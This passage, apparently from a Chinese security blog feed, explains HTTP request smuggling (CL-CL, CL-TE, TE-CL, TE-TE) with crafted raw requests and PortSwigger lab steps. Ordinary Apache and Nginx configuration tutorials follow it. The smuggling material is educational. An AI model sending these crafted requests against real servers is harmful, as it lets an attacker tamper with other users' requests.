Pipelining(管线化)字段，它是将多个http请求批量提交,而不用等收到响应再提交的异步技术。如下图就是使用Pipelining和非Pipelining这意味着前端与后端必须短时间内对每个数据包的边界大小达成一致，否则，攻击者就可以构造发送一个特殊的数据包，在前端看来它是一个请求，但在后端却被解释为了两个不同的HTTP请求。这就导致攻击者可以在下一个用户发送的合法数据包前恶意添加内容。如图，走私的内容(“前缀”)，以橙色突出显示：假设前端考虑的是内容长度头部(Content-Length)值作为数据包结束的边界，后端优先考虑的是Transfer-Encoding头部。那么从后端角度看，如下图蓝色部份字体属于一个数据包，而红色部份字体属于下一个数据包的开始部份。这样就成功从前端“走私”了一个数据包 走私方式CL不为0的GET请求假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 Content-Length头，不进行处理。这就有可能导致请求走私。 比如发送下面请求 12345GET / HTTP/1.1Host:example.comContent-Length:44GET /socket HTTP/1.1Host: example.com 前端服务器通过读取Content-Length，确认这是个完整的请求，然后转发到后端服务器，而后端服务器因为不对Content-Length进行判断，由于Pipeline的存在，它认为这是两个请求，分别为 第一个 12GET / HTTP/1.1Host: example.com 第二个 12GET /socket HTTP/1.1Host: example.com 则相当于走私了请求 CL-CL在RFC7230规范中，规定当服务器收到的请求中包含两个 Content-Length，而且两者的值不同时，需要返回400错误。但难免会有服务器不严格遵守该规范。假设前端和后端服务器都收到该类请求，且不报错，其中前端服务器按照第一个Content-Length的值对请求进行为数据包定界，而后端服务器则按照第二个Content-Length的值进行处理。 这时攻击者可以恶意构造一个特殊的请求， 123456POST / HTTP/1.1Host: example.comContent-Length: 6Content-Length: 5123A CDN服务器获取到的数据包的长度6，将上述整个数据包转发给后端的服务器，而后端服务器获取到的数据包长度为5。当读取完前5个字符后，后端服务器认为该请求已经读取完毕，然后发送出去。而此时的缓冲区去还剩余一个字母 A，对于后端服务器来说，这个 A是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，则该A字母会拼凑到下一个正常用户请求的前面，攻击在此展开。 CL-TE前置服务器认为 Content-Length 优先级更高（或者根本就不支持 Transfer-Encoding ） ，后端认为 Transfer-Encoding 优先级更高。 举个栗子，假如发送的请求如下： 12345678POST / HTTP/1.1Host: 1.comContent-Length: 6Transfer-Encoding: chunked0A 前置服务器根据 Content-Length: 6 判断出这是一个完整的请求，于是整体转发到后端服务器，但后端根据 Transfer-Encoding: chunked 将请求主体截断到 0\\r\\n\\r\\n 并认为一个完整的请求结束了，最后剩下的 A 就被认为是下一个请求的一部分，留在缓冲区中等待剩余的请求。如果此时其他用户此时发送了一个 GET 请求，就会与 A 拼接成一个畸形的 AGET，造成服务器解析异常： 123AGET / HTTP/1.1Host: 1.com.... 在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。注意：需要发送两次请求 实验：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 进入靶场抓包，修改为POST请求方式，关闭burp suite自动更新Content-Length功能修改数据包，添加 Transfer-Encoding: chunked，修改数据包Content-Length的值。Content-Length为10的原因为回车占据两字节，回车+0+回车+HELLO共10字节，接着提交，返回正常。再次提交，提示：”Unrecognized method HELLOPOST” TE-CL前置服务器认为 Transfer-Encoding 优先级更高，后端认为 Content-Length 优先级更高（或者不支持 Transfer-Encoding ）。 以如下请求为例： 123456789101112POST / HTTP/1.1Host: ac7f1f821ea8d83280cc5eda009200f6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunked17POST /rook1e HTTP/1.10[空白行][空白行] 前置服务器将其分块传输，其实就一个长度为 23 的块 POST /rook1e HTTP/1.1\\r\\n，但后端服务器根据 Content-Length: 4 截取到 17\\r\\n 即认为是一个完整的请求，剩下的留在缓冲区中等待剩余内容，若此时由用户发送了一个 GET，即被拼接成了一个 POST /rook1e 走私请求。 123456POST /rook1e HTTP/1.10GET / HTTP/1.1.... 连发两次包，可以发现后端服务器找不到 /rook1e 而返回 404。 实验: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl TE-TE前端服务器处理第一个Transfer-Encoding请求头，后端服务器处理第二个Transfer-Encoding请求头。 构造数据包 123456Host:example.comContent-length: 3Transfer-Encoding: chunkedTransfer-encoding: errorchunkedcode0 这里是用了两个Transfer-Encoding 字段，并且第二个 TE 字段值为错误值，这里 前端服务器选择对第一个 Transfer-Encoding进行处理，整个请求正常，原封不动转发给后端服务器，而后端服务器则以第二个Transfer-Encoding 字段进行优先处理，而第二个Transfer-Encoding 字段非标准值，根据RPC规范，则会取Content-Length字段进行处理，这样这个请求就会被拆分为两个请求。 在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。 注意：需要发送两次请求 实验：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header 例题https://xz.aliyun.com/t/6654#toc-5 参考文章: http走私浅析HTTP走私攻击浅谈HTTP请求走私协议层的攻击——HTTP请求走私从一道题到协议层攻击之HTTP请求走私从一道题深入HTTP协议与HTTP请求走私","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://blog.cfyqy.com/tags/HTTP/"}],"author":"ye1s"},{"title":"Apache浅识","slug":"apache浅识","date":"2020-08-04T09:11:00.000Z","updated":"2020-08-06T05:26:06.904Z","comments":true,"path":"article/ff438041.html","link":"","permalink":"https://blog.cfyqy.com/article/ff438041.html","excerpt":"Apache是使用最广泛的Web服务器应用程序。之前都是照着网上的命令配置，没有真正去理解一下配置的缘由，这次就好好学习一下啦。","text":"Apache是使用最广泛的Web服务器应用程序。之前都是照着网上的命令配置，没有真正去理解一下配置的缘由，这次就好好学习一下啦。 ubuntu安装 1apt install apache2 目录文件123ye1s@ye1s:/etc/apache2$ lsapache2.conf conf-enabled magic mods-enabled sites-availableconf-available envvars mods-available ports.conf sites-enabled 文件/目录 功能 apache2.conf Apache在启动时会自动读取这个文件的配置信息而其他的一些配置文件，通过Include指令包含一些文件。在apache2.conf中可以找到这些Include行：例IncludeOptional mods-enabled/*.load ports.conf Apache使用的端口，必须在这里开启端口的监听，不然只在virtualhosts里设置的端口不起作用 sites-enabled/ apache2.conf中引用了这里面的虚拟主机配置,通过ls -l可以发现，这里得到文件都是链接向../sites-available/的，而apache2.conf只引用sites-enabled/而不引用/sites-available/，所以我们在/sites-available/里面配置好虚拟主机配置后，还要连接到sites-enabled/目录 sites-available/ 虚拟主机的配置目录，但是不会被引用，需要链接到../site-enabled mods-enabled/ 存放apache功能模块，与sites-enabled类似，是链接目录，而且被apache2.conf引用 mods-available/ 存放apache功能模块，与sites-available类似，是真实配置，不被引用，需要连接 envvars 存放相关变量 网站配置配置流程新建虚拟主机/网站 12root@VM-10-194-ubuntu:/# cd /etc/apache2/sites-availableroot@VM-10-194-ubuntu:/etc/apache2/sites-available# vi test-site.conf 虚拟主机/网站配置规则语法 123&lt;VirtualHost 地址[:端口号] [地址[:端口号]] &gt;具体规则 &lt;/VirtualHost&gt; 端口号需要在ports.conf里添加监听 一个端口号只能被一个VirtualHost监听 建立连接 1ln -s /etc/apache2/sites-available/test-site.conf /etc/apache2/sites-enabled/test.site.conf 将网站根目录 1chown -R www-data:www-data /var/www/html/xxx 重启Apache 1/etc/init.d/apache2 restart 配置实例虚拟主机 123456ServerName 主机名/域名ServerAdmin 管理员邮箱DocumentRoot 网站目录ErrorLog 日志目录CustomLog 日志目录Deny from 阻止访问IP 基于ip需有多个ip 1234567891011121314&lt;VirtualHost IP1:80&gt; ServerName a.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/a ErrorLog /home/data/log/a_error.log CustomLog /home/data/log/a_access.log combined&lt;/Virtualhost&gt;&lt;VirtualHost IP2:80&gt; ServerName b.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/b ErrorLog /home/data/log/b_error.log CustomLog /home/data/log/b_access.log combined&lt;/Virtualhost&gt; 基于域名1234567891011121314&lt;VirtualHost *:80&gt; ServerName a.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/a ErrorLog /home/data/log/a_error.log CustomLog /home/data/log/a_access.log combined&lt;/Virtualhost&gt;&lt;VirtualHost *:80&gt; ServerName b.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/b ErrorLog /home/data/log/b_error.log CustomLog /home/data/log/b_access.log combined&lt;/Virtualhost&gt; 基于端口需要开启端口监听配置 12Listen 80Listen 8080 网站配置 1234567891011121314&lt;VirtualHost IP:80&gt; ServerName a.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/a ErrorLog /home/data/log/a_error.log CustomLog /home/data/log/a_access.log combined&lt;/Virtualhost&gt;&lt;VirtualHost IP:8080&gt; ServerName b.com ServerAdmin webmaster@localhost DocumentRoot /home/data/www/b ErrorLog /home/data/log/b_error.log CustomLog /home/data/log/b_access.log combined&lt;/Virtualhost&gt; 反向代理启用代理模块 1a2enmod proxy proxy_balancer proxy_http 修改配置 1vi /etc/apache2/sites-available/000-default.conf 在最前面添加 1234567891011&lt;VirtualHost *:80&gt; Servername 代理服务器ip或者域名 ProxyRequests Off#off表示开启反向代理，on表示开启正向代理 ProxyPass / 被代理的网站 ProxyPassReverse / 被代理的网站 &lt;Proxy *&gt; Order Deny,Allow Allow from all &lt;/Proxy&gt;&lt;/VirtualHost&gt; 重启生效 1/etc/init.d/apache2 restart centos安装 1yum install httpd 启动 123service httpd startsudo systemctl enable httpdsudo systemctl start httpd 配置文件 12[ye1s@localhost httpd]$ lsconf conf.d conf.modules.d logs modules run Apache配置片段配置片段容器的类型&lt;IfDefine&gt;，&lt;IfModule&gt;和&lt;IfVersion&gt;容器仅在服务器启动和重新启动时进行评估。 &lt;IfDefine&gt;指令包含只有在httpd命令行中定义了适当参数时才会应用的指令。 1234#使用httpd -DClosedForNow启动服务器时，所有请求才会重定向到另一个站点&lt;IfDefine ClosedForNow&gt; Redirect \"/\" \"http://otherserver.example.com/\"&lt;/IfDefine&gt; &lt;IfModule&gt;指令与上面&lt;IfDefine&gt;指令也非常相似，除了它包含只有在服务器中有特定模块可用时才会应用的指令. 1234#仅当mod_mime_magic可用时才会应用MimeMagicFile指令。&lt;IfModule mod_mime_magic.c&gt; MimeMagicFile conf/magic&lt;/IfModule&gt; &lt;IfVersion&gt;指令包含的指令只会在特定版本的服务器执行时才会应用。 1234&lt;IfVersion &gt;= 2.4&gt; # this happens only in versions greater or # equal 2.4.0.&lt;/IfVersion&gt; &lt;IfDefine&gt;，&lt;IfModule&gt;和&lt;IfVersion&gt;可以通过在测试前加上!符号来应用否定条件 文件系统和网站空间文件系统是操作系统可以看到的磁盘视图。网站空间是由Web服务器提供并由客户端查看的站点视图。 文件系统包含在&lt;Directory&gt;部分中的指令适用于指定的文件系统目录和该目录的所有子目录(以及这些目录中的文件) 1234#以下配置中，将为/var/web/dir1目录和所有子目录启用目录索引。&lt;Directory /var/web/dir1&gt; Options +Indexes&lt;/Directory&gt; 包含在&lt;Files&gt;部分中的指令适用于具有指定名称的任何文件，无论它位于何种目录中。 1234#以下配置指令在放置在配置文件的主部分时将拒绝访问任何文件。文件名为private.html，无论它在哪里找到。&lt;Files \"private.html\"&gt; Require all denied&lt;/Files&gt; 可以组合&lt;Files&gt;和&lt;Directory&gt;片段 123456#拒绝访问/var/www/dir1/ 目录下的所有private.html文件&lt;Directory \"/var/web/dir1\"&gt; &lt;Files \"private.html\"&gt; Require all denied &lt;/Files&gt;&lt;/Directory&gt; Webspace容器&lt;Location&gt;指令及其正则表达式对应方更改了Webspace中内容的配置 1234#以下配置可防止访问以/private开头的任何URL路径 &lt;LocationMatch \"^/private\"&gt; Require all denied&lt;/LocationMatch&gt; &lt;Location&gt;指令不需要与文件系统有任何关系 1234#将特定URL映射到mod_status提供的内部Apache HTTP Server处理程序 &lt;Location \"/server-status\"&gt; SetHandler server-status&lt;/Location&gt; 重叠Webspace为了有两个重叠的URL，必须考虑评估某些部分或指令的顺序。对于&lt;Location&gt;将是： 1234&lt;Location \"/foo\"&gt;&lt;/Location&gt;&lt;Location \"/foo/bar\"&gt;&lt;/Location&gt; 另一方面，&lt;Alias&gt;映射反之亦然： 12Alias \"/foo/bar\" \"/srv/www/uncommon/bar\"Alias \"/foo\" \"/srv/www/common/foo\" ProxyPass指令也是如此： 12ProxyPass \"/special-area\" \"http://special.example.com\" smax=5 max=10ProxyPass \"/\" \"balancer://mycluster/\" stickysession=JSESSIONID|jsessionid nofailover=On 通配符和正则表达式&lt;Directory&gt;，&lt;Files&gt;和&lt;Location&gt;指令都可以使用shell样式的通配符，如C标准库中的fnmatch。 *匹配任何字符序列 ? 匹配任何单个字符 [seq]匹配seq中的任何字符 /字符不会被任何通配符匹配 1234#可以一次拒绝访问多种类型的图像文件 &lt;FilesMatch \"\\.(?i:gif|jpe?g|png)$\"&gt; Require all denied&lt;/FilesMatch&gt; 布尔表达式&lt;If&gt;指令根据可由布尔表达式表示的条件更改配置。 1234#如果HTTP Referer标头不以http://www.example.com/开头，则以下配置拒绝访问。&lt;If \"!(%&#123;HTTP_REFERER&#125; -strmatch 'http://www.example.com/*')\"&gt; Require all denied&lt;/If&gt; proxy1234# 只允许客户使用代理服务器访问www.example.com网站的一个子集&lt;Proxy \"http://www.example.com/*\"&gt; Require host yournetwork.example.com&lt;/Proxy&gt; 配置文件httpd.conf基本配置123456ServerRoot \"/mnt/software/apache2\" #你的apache软件安装的位置。其它指定的目录如果没有指定绝对路径，则目录是相对于该目录。PidFile logs/httpd.pid #第一个httpd进程(所有其他进程的父进程)的进程号文件位置。Listen 80 #服务器监听的端口号。ServerName www.clusting.com:80 #主站点名称（网站的主机名）。ServerAdmin admin@clusting.com #管理员的邮件地址。DocumentRoot \"/mnt/web/clusting\" #主站点的网页存储位置。 对主站点的目录进行访问控制： 123456&lt;Directory \"/mnt/web/clusting\"&gt; Options FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; 参数详解: Options：配置在特定目录使用哪些特性，常用的值和基本含义如下： ExecCGI: 在该目录下允许执行CGI脚本。 FollowSymLinks: 在该目录下允许文件系统使用符号连接。 Indexes: 当用户访问该目录时，如果用户找不到DirectoryIndex指定的主页文件(例如index.html),则返回该目录下的文件列表给用户。 SymLinksIfOwnerMatch: 当使用符号连接时，只有当符号连接的文件拥有者与实际文件的拥有者相同时才可以访问。 AllowOverride：允许存在于.htaccess文件中的指令类型(.htaccess文件名是可以改变的，其文件名由AccessFileName指令决定) None: 当AllowOverride被设置为None时。不搜索该目录下的.htaccess文件（可以减小服务器开销）。 All: 在.htaccess文件中可以使用所有的指令。 Order：控制在访问时Allow和Deny两个访问规则哪个优先： Allow：允许访问的主机列表(可用域名或子网，例如：Allow from 192.168.0.0/16)。 Deny：拒绝访问的主机列表。 DirectoryIndex index.html index.htm index.php #主页文件的设置 服务器的优化 (MPM: Multi-Processing Modules)apache2主要的优势就是对多处理器的支持更好，在编译时同过使用--with-mpm选项来决定apache2的工作模式。 prefork：如果httpd -l列出prefork.c，则需要对下面的段进行配置。 1234567&lt;IfModule prefork.c&gt;StartServers 5 #启动apache时启动的httpd进程个数。MinSpareServers 5 #服务器保持的最小空闲进程数。MaxSpareServers 10 #服务器保持的最大空闲进程数。MaxClients 150 #最大并发连接数。MaxRequestsPerChild 1000 #每个子进程被请求服务多少次后被kill掉。0表示不限制，推荐设置为1000。&lt;/IfModule&gt; 在该工作模式下，服务器启动后起动5个httpd进程(加父进程共6个，通过ps -ax|grep httpd命令可以看到)。当有用户连接时，apache会使用一个空闲进程为该连接服务，同时父进程会fork一个子进程。直到内存中的空闲进程达到MaxSpareServers。该模式是为了兼容一些旧版本的程序。我缺省编译时的选项。 worker：如果httpd -l列出worker.c，则需要对下面的段进行配置： 12345678&lt;IfModule worker.c&gt; StartServers 2 #启动apache时启动的httpd进程个数。 MaxClients 150 #最大并发连接数。 MinSpareThreads 25 #服务器保持的最小空闲线程数。 MaxSpareThreads 75 #服务器保持的最大空闲线程数。 ThreadsPerChild 25 #每个子进程的产生的线程数。 MaxRequestsPerChild 0 #每个子进程被请求服务多少次后被kill掉。0表示不限制，推荐设置为1000。 &lt;/IfModule&gt; 该模式是由线程来监听客户的连接。当有新客户连接时，由其中的一个空闲线程接受连接。服务器在启动时启动两个进程，每个进程产生的线程数是固定的(ThreadsPerChild决定)，因此启动时有50个线程。当50个线程不够用时，服务器自动fork一个进程，再产生25个线程。 perchild：如果httpd -l列出perchild.c，则需要对下面的段进行配置： 12345678&lt;IfModule perchild.c&gt; NumServers 5 #服务器启动时启动的子进程数 StartThreads 5 #每个子进程启动时启动的线程数 MinSpareThreads 5 #内存中的最小空闲线程数 MaxSpareThreads 10 #最大空闲线程数 MaxThreadsPerChild 2000 #每个线程最多被请求多少次后退出。0不受限制。 MaxRequestsPerChild 10000 #每个子进程服务多少次后被重新fork。0表示不受限制。 &lt;/IfModule&gt; 该模式下，子进程的数量是固定的，线程数不受限制。当客户端连接到服务器时，又空闲的线程提供服务。 如果空闲线程数不够，子进程自动产生线程来为新的连接服务。该模式用于多站点服务器。 如果知道当前的apache2使用什么工作机制，可以通过httpd -l命令列出apache的所有模块，就可以知道其工作方式 HTTP返头回信息配置 ServerTokens Prod #该参数设置http头部返回的apache版本信息，可用的值和含义如下：123456Prod：仅软件名称，例如：apacheMajor：包括主版本号，例如：apache/2Minor：包括次版本号，例如：apache/2.0Min：仅apache的完整版本号，例如：apache/2.0.54OS：包括操作系统类型，例如：apache/2.0.54（Unix）Full：包括apache支持的模块及模块版本号，例如：Apache/2.0.54 (Unix) mod_ssl/2.0.54 OpenSSL/0.9.7g ServerSignature Off #在页面产生错误时是否出现服务器版本信息。推荐设置为Off 持久性连接设置123KeepAlive On #开启持久性连接功能。即当客户端连接到服务器，下载完数据后仍然保持连接状态。MaxKeepAliveRequests 100 #一个连接服务的最多请求次数。KeepAliveTimeout 30 #持续连接多长时间，该连接没有再请求数据，则断开该连接。缺省为15秒。 别名设置对于不在DocumentRoot指定的目录内的页面，既可以使用符号连接，也可以使用别名。别名的设置如下： 12345678Alias /download/ \"/var/www/download/\" #访问时可以输入:http://www.custing.com/download/ &lt;Directory \"/var/www/download\"&gt; #对该目录进行访问控制设置 Options Indexes MultiViews AllowOverride AuthConfig Order allow,deny Allow from all &lt;/Directory&gt; CGI设置123456789# 访问时可以：http://www.clusting.com/cgi-bin/，但是该目录下的CGI脚本文件要加可执行权限ScriptAlias /cgi-bin/ \"/mnt/software/apache2/cgi-bin/\" &lt;Directory \"/usr/local/apache2/cgi-bin\"&gt; #设置目录属性 AllowOverride None Options None Order allow,deny Allow from all &lt;/Directory&gt; 日志的设置(1) 错误日志的设置 12ErrorLog logs/error_log #日志的保存位置LogLevel warn #日志的级别 (2) 访问日志设置日志的缺省格式有如下几种： 12345LogFormat \"%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"\" combinedLogFormat \"%h %l %u %t \"%r\" %&gt;s %b\" common #common为日志格式名称LogFormat \"%&#123;Referer&#125;i -&gt; %U\" refererLogFormat \"%&#123;User-agent&#125;i\" agentCustomLog logs/access_log common 格式中的各个参数如下： 123456789%h --客户端的ip地址或主机名 %l --The 这是由客户端 identd 判断的RFC 1413身份，输出中的符号 \"-\" 表示此处信息无效。 %u --由HTTP认证系统得到的访问该网页的客户名。有认证时才有效，输出中的符号 \"-\" 表示此处信息无效。 %t --服务器完成对请求的处理时的时间。 \"%r\" --引号中是客户发出的包含了许多有用信息的请求内容。 %&gt;s --这个是服务器返回给客户端的状态码。 %b --最后这项是返回给客户端的不包括响应头的字节数。 \"%&#123;Referer&#125;i\" --此项指明了该请求是从被哪个网页提交过来的。 \"%&#123;User-Agent&#125;i\" --此项是客户浏览器提供的浏览器识别信息。 .htaccess文件.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 可以在服务器配置文件中按以下方法配置： 12AccessFileName .config #将.htaccess修改为.configAllowOverride None #禁用.htaccess文件的使用 下面两个配置是等同的 .htaccess文件在目录/www/htdocs/example之中: 1AddType text/example \".exm\" httpd.conf文件中的内容: 123&lt;Directory \"/www/htdocs/example\"&gt; AddType text/example \".exm\"&lt;/Directory&gt; 在.htaccess文件中找到的配置指令将应用于找到.htaccess文件的目录。特定目录中的.htaccess文件可能会覆盖在目录树中较高位置的.htaccess文件中找到的指令。例如：/www/htdocs/example1/example2下的.htaccess覆盖了/www/htdocs/example1/下的.htaccess 。 参考文章：Apache HTTP 服务器 2.4 文档Apache学习Apache配置实例Apache 反向代理Apache教程Apache配置文件httpd.conf详解","categories":[{"name":"中间件","slug":"中间件","permalink":"https://blog.cfyqy.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}],"tags":[{"name":"apache","slug":"apache","permalink":"https://blog.cfyqy.com/tags/apache/"}],"author":"ye1s"},{"title":"Nginx浅识","slug":"nginx浅识","date":"2020-08-04T09:11:00.000Z","updated":"2021-01-06T17:20:58.196Z","comments":true,"path":"article/f8303638.html","link":"","permalink":"https://blog.cfyqy.com/article/f8303638.html","excerpt":"Nginx (“engine x”) 是一个高性能的 HTTP 和反向代理服务器,特点是占有内存少，并发能力强。","text":"Nginx (“engine x”) 是一个高性能的 HTTP 和反向代理服务器,特点是占有内存少，并发能力强。 安装和配置centos安装在/etc/yum.repos.d目录下面创建一个nginx的yum源 12cd /etc/yum.repos.d #切换到yum安装源文件目录vi nginx.repo #创建一个安装包源 复制一下内容 12345678910111213[nginx-stable]name=nginx stable repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=1enabled=1gpgkey=https://nginx.org/keys/nginx_signing.key[nginx-mainline]name=nginx mainline repobaseurl=http://nginx.org/packages/mainline/centos/$releasever/$basearch/gpgcheck=1enabled=0gpgkey=https://nginx.org/keys/nginx_signing.key 查看是否成功加载这个安装源 1yum repolist 开始安装 1yum install -y nginx 启动/停止/重启服务 123systemctl start/stop/restart nginx.service #在centos7+ 启动/停止/重启nginx服务service nginx start/stop/restart #启动/停止/重启nginx -s stop/reload/quit #粗鲁的停止/重载/优雅停止 其他命令 123456789101112131415[ye1s@localhost yum.repos.d]$ nginx -hnginx version: nginx/1.18.0Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /etc/nginx/) -c filename : set configuration file (default: /etc/nginx/nginx.conf) -g directives : set global directives out of configuration file 配置目录文件 123[ye1s@localhost nginx]$ lsconf.d koi-utf mime.types nginx.conf uwsgi_paramsfastcgi_params koi-win modules scgi_params win-utf ubuntu安装1apt-get install nginx 配置目录文件 12345ye1s@ye1s:/etc/nginx$ lsconf.d koi-utf modules-enabled sites-available win-utfdefault koi-win nginx.conf sites-enabledfastcgi.conf mime.types proxy_params snippetsfastcgi_params modules-available scgi_params uwsgi_params nginx.conf以下来分析一下nginx.conf这个文件中的内容nginx配置文件分为三大块，全局块，events块，http块。 全局块1234567user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;# Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.include /usr/share/nginx/modules/*.conf; 这里主要会设置一些影响 nginx 服务器整体运行的配置指令，主要包括配 置运行 Nginx 服务器的用户（组）、允许生成的 worker process 数，进程 PID 存放路径、日志存放路径和类型以及配置文件的引入等。 比如 worker_processes auto； 这一行，worker_processes 值越大，我们nginx可支持的并发数量就越多 events 块123events &#123; worker_connections 1024;&#125; events 块涉及的指令主要影响 Nginx 服务器与用户的网络连接，常用的设置包括是否开启对多 work process下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型来处理连接请求，每个 wordprocess 可以同时支持的最大连接数等。 http块1234567891011121314151617181920http &#123; include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf;&#125; http 全局块配置的指令包括文件引入、MIME-TYPE 定义、日志自定义、连接超时时间、单链接请求数上限等。而http块中的server块则相当于一个虚拟主机，一个http块可以拥有多个server块。server块又包括全局server块，和location块。全局server块主要包括了本虚拟机主机的监听配置和本虚拟主机的名称或 IP 配置location块则用来对虚拟主机名称之外的字符串进行匹配，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能，还有许多第三方模块的配置也在这里进行。比如，对/usr相关的请求交给8080来处理，/admin则较给8081处理。 Nginx配置设置只允许域名访问12345listen 80;server_name www.xuqian8.com;if ($host != 'www.xuqian8.com')&#123; return 403;&#125; thinkphp配置config.php中设置 123&#x2F;* URL配置 *&#x2F;&#39;URL_CASE_INSENSITIVE&#39; &#x3D;&gt; true, &#x2F;&#x2F; 默认false 表示URL区分大小写 true则表示不区分大小写&#39;URL_MODEL&#39; &#x3D;&gt; 2, &#x2F;&#x2F; URL模式 nginx.conf 12345678910111213141516171819202122server &#123; listen 80; server_name src.hillstonenet.com; root /var/www/xsrc; # 该项要修改为你准备存放相关网页的路径 index index.html index.htm index.php l.php; location / &#123; root /var/www/xsrc; index index.php index.html index.htm;&#125; #proxy the php scripts to php-fpm location ~ .+\\.php($|/) &#123; root /var/www/xsrc; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_split_path_info ^(.+\\.php)(.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 配置vue12345678910111213141516server &#123; listen 8888; listen [::]:8888; server_name localhost; root /var/www/search/frontend; index index.html index.htm; location / &#123; try_files $uri $uri/ @router; index index.html index.htm; &#125; location @router &#123; rewrite ^.*$ /index.html last; &#125; &#125; 配置 djangopip安装 uwsgi 1pip3 install uwsgi mysite.ini 123456789[uwsgi]socket = 127.0.0.1:9901chdir = /var/www/search/backendmodule = backend.wsgimaster = trueprocesses = 10threads = 40vacuum = truedaemonize = /tmp/uwsgi.log #输出信息打印在日志 启动 1uwsgi --ini mysite.ini nginx配置 123456789101112131415server &#123; listen 8000; server_name 127.0.0.1 charset UTF-8; access_log /var/log/nginx/backend_access.log; error_log /var/log/nginx/backend_error.log; client_max_body_size 75M; location / &#123; include uwsgi_params; uwsgi_pass 127.0.0.1:9901; uwsgi_read_timeout 2; &#125; &#125; 注意点setting.py 的ALLOWED_HOSTS配置为*，要不会出现Bad request 400 123DEBUG = FalseALLOWED_HOSTS = ['*'] 出现502错误 12sudo apt-get install uwsgi-plugin-python3 ` mysite.ini文件中添加 1plugins=python3 添加证书123456789101112131415161718192021222324252627282930313233#80重定向443server &#123; listen 80; server_name src.hillstonenet.com; rewrite ^(.*)$ https://src.hillstonenet.com/;&#125;server &#123; listen 443 ssl; server_name src.hillstonenet.com; root /var/www/xsrc; # 该项要修改为你准备存放相关网页的路径 index index.html index.htm index.php l.php; ssl_certificate cert/1_src.hillstonenet.com_bundle.crt; ssl_certificate_key cert/2_src.hillstonenet.com.key; ssl_session_timeout 1m; location / &#123; root /var/www/xsrc; index index.php index.html index.htm;&#125; #proxy the php scripts to php-fpm location ~ .+\\.php($|/) &#123; root /var/www/xsrc; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_split_path_info ^(.+\\.php)(.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125;~~ 限制ip访问速率1234567891011121314151617181920212223 ngx_http_limit_req_module：限制某一时间内，单一IP的请求数．示例：复制代码http &#123; limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s; ... #定义一个名为one的limit_req_zone用来存储session，大小是10M内存， #以$binary_remote_addr 为key,限制平均每秒的请求为1个， #1M能存储16000个状态，rete的值必须为整数， server &#123; ... location /search/ &#123; limit_req zone=one burst=5; #限制每ip每秒不超过1个请求，漏桶数burst为5,也就是队列． #nodelay，如果不设置该选项，严格使用平均速率限制请求数，超过的请求被延时处理． 反向代理12345678910111213141516171819202122232425server &#123; listen 8888 ; ##设置我们nginx监听端口为8888 server_name [服务器的ip地址]; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location /hi/ &#123; proxy_pass http://127.0.0.1:8080; ##需要代理的服务器地址 index index.html; &#125; location /hello/ &#123; proxy_pass http://127.0.0.1:8081; ##需要代理的服务器地址 index index.html; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125; 在浏览器中输入：服务器ip:8888/hi/hi.html浏览器显示 I am hi 对应服务器端口为 8080在浏览器中输入：服务器ip:8888/hello/hello.html浏览器显示 I am hello 对应服务器端口为 8081从而实现了针对不同url请求分发给不同服务器的功能配置。 location指令说明:功能：用于匹配URL语法如下： 12345671、= ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求。2、~：用于表示 uri 包含正则表达式，并且区分大小写。3、~*：用于表示 uri 包含正则表达式，并且不区分大小写。4、^~：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 